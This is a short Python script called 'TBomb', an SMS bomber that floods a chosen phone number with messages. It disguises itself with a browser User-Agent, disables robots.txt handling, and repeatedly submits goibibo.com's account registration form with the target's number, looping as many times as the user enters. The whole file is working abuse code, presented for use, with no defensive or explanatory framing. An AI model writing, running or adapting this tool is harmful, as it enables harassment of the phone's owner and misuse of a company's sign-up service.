try:
	import mechanize
	br = mechanize.Browser()
	br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36')]
	br.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print('\n---------- Welcome To TBomb ----------\n')

ph=str(input('Enter phone number: ').strip())
n=int(input('Enter count: '))

def bomber(ph):
	res = br.open('https://www.goibibo.com/accounts/register/')
	try:
		if res.code == 200:
			br.select_form(nr=1)
			br.form['mobile'] = ph
			br.form['password1'] = 'smsbombertest'
			res = br.submit()
	except:
		print('Try failed')

c=0
while c<n:
	bomber(ph)
	print(c)
	c=c+1
print('\n--------sms bombing complited---------\n')
